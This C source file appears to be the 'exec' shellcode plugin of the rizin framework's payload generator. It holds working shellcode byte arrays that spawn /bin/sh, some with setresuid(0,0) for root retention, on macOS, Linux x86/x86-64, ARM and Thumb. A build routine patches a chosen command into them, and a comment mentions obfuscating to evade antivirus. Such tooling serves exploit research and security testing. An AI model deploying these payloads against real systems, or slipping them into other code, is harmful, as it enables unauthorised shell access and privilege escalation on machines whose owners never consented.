// SPDX-FileCopyrightText: 2011 pancake <pancake@nopcode.org>
// SPDX-License-Identifier: LGPL-3.0-only
#include <rz_egg.h>

#if 0
linux setresuid(0,0)+execv(/bin/sh)
31c031db31c999b0a4cd806a0b5851682f2f7368682f62696e89e35189e25389e1cd80

SETRESUID: (11 bytes)
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80"

BINSH: (24 bytes) (x86-32/64):
"\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";
#endif

// XXX: must obfuscate to avoid antivirus
// OSX
static ut8 x86_osx_suid_binsh[] =
	"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"
	/* suid */ "\x31\xff\x4c\x89\xc0\x0f\x05"
	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
	"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
	// CMD
	"\x2f\x62\x69\x6e\x2f\x73\x68";
static ut8 x86_osx_binsh[] =
	"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"
	// SUIDSH "\x31\xff\x4c\x89\xc0\x0f\x05"
	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
	"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
	// CMD
	"\x2f\x62\x69\x6e\x2f\x73\x68";

// linux
static ut8 x86_linux_binsh[] =
	"\x31\xc0\x50\x68"
	"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" // /bin/sh here
	"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

#if 0
static ut8 x86_64_linux_binsh[] =
	"\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53"
	"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b"
	"\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";
#endif

static ut8 x86_64_linux_binsh[] =
	"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

static ut8 arm_linux_binsh[] =
	"\x02\x20\x42\xe0\x1c\x30\x8f\xe2\x04\x30\x8d\xe5"
	"\x08\x20\x8d\xe5\x13\x02\xa0\xe1\x07\x20\xc3\xe5\x04\x30\x8f\xe2"
	"\x04\x10\x8d\xe2\x01\x20\xc3\xe5\x0b\x0b\x90\xef"
	"\x2f\x62\x69\x6e\x2f\x73\x68"; // "/bin/sh";

static ut8 thumb_linux_binsh[] =
	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90"
	"\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"; // "/bin/sh";

static RzBuffer *build(RzEgg *egg) {
	RzBuffer *buf = rz_buf_new();
	const ut8 *sc = NULL;
	int cd = 0;
	char *shell = rz_egg_option_get(egg, "cmd");
	char *suid = rz_egg_option_get(egg, "suid");
	// TODO: last char must not be \x00 .. or what? :D
	if (suid && *suid == 'f') { // false
		free(suid);
		suid = NULL;
	}
	switch (egg->os) {
	case RZ_EGG_OS_OSX:
	case RZ_EGG_OS_DARWIN:
		switch (egg->arch) {
		case RZ_SYS_ARCH_X86:
			if (suid) {
				sc = x86_osx_suid_binsh;
				cd = 7 + 36;
			} else {
				sc = x86_osx_binsh;
				cd = 36;
			}
		case RZ_SYS_ARCH_ARM:
			// TODO
			break;
		}
		break;
	case RZ_EGG_OS_LINUX:
		if (suid) {
			eprintf("no suid for this platform\n");
		}
		suid = 0;
		switch (egg->arch) {
		case RZ_SYS_ARCH_X86:
			switch (egg->bits) {
			case 32:
				sc = x86_linux_binsh;
				break;
			case 64:
				sc = x86_64_linux_binsh;
				if (shell && *shell) {
					int len = strlen(shell);
					if (len > sizeof(st64) - 1) {
						*shell = 0;
						eprintf("Unsupported CMD length\n");
						break;
					}
					st64 b = 0;
					memcpy(&b, shell, strlen(shell));
					b = -b;
					shell = realloc(shell, sizeof(st64) + 1);
					if (!shell) {
						break;
					}
					rz_str_ncpy(shell, (char *)&b, sizeof(st64));
					shell[sizeof(st64)] = 0;
					cd = 4;
					rz_buf_set_bytes(buf, sc, strlen((const char *)sc));
					rz_buf_write_at(buf, cd, (const ut8 *)shell, sizeof(st64));
					sc = 0;
				}
				break;
			default:
				eprintf("Unsupported arch %d bits\n", egg->bits);
			}
			break;
		case RZ_SYS_ARCH_ARM:
			switch (egg->bits) {
			case 16:
				sc = thumb_linux_binsh;
				break;
			case 32:
				sc = arm_linux_binsh;
				break;
			default:
				eprintf("Unsupported arch %d bits\n", egg->bits);
			}
			break;
		}
		break;
	default:
		eprintf("Unsupported os %x\n", egg->os);
		break;
	}

	if (sc) {
		rz_buf_set_bytes(buf, sc, strlen((const char *)sc));
		if (shell && *shell) {
			if (cd) {
				rz_buf_write_at(buf, cd, (const ut8 *)shell, strlen(shell) + 1);
			} else {
				eprintf("Cannot set shell\n");
			}
		}
	}
	free(suid);
	free(shell);
	return buf;
}

//TODO: rename plugin to run
RzEggPlugin rz_egg_plugin_exec = {
	.name = "exec",
	.type = RZ_EGG_PLUGIN_SHELLCODE,
	.desc = "execute cmd=/bin/sh suid=false",
	.build = (void *)build
};

#ifndef RZ_PLUGIN_INCORE
RZ_API RzLibStruct rizin_plugin = {
	.type = RZ_LIB_TYPE_EGG,
	.data = &rz_egg_plugin_exec,
	.version = RZ_VERSION
};
#endif
